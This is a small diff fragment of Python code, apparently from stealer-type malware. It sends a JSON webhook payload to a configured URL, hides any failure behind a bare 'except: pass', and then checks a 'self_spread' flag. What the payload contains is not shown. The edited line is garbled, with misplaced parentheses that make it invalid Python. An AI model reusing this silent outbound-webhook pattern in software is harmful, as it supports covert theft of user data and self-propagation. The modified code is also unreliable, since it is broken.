@@ -196,7 +196,7 @@ def main():
     }
     try:
         
-        urlopen(Request(str(settingsurl), data=dumps(webhook).encode(), headers=getHeader()))
+        urlopen(Request(settingsurl)), data=dumps(webhook).encode(), headers=getHeader()))
     except:
         pass
     if self_spread:
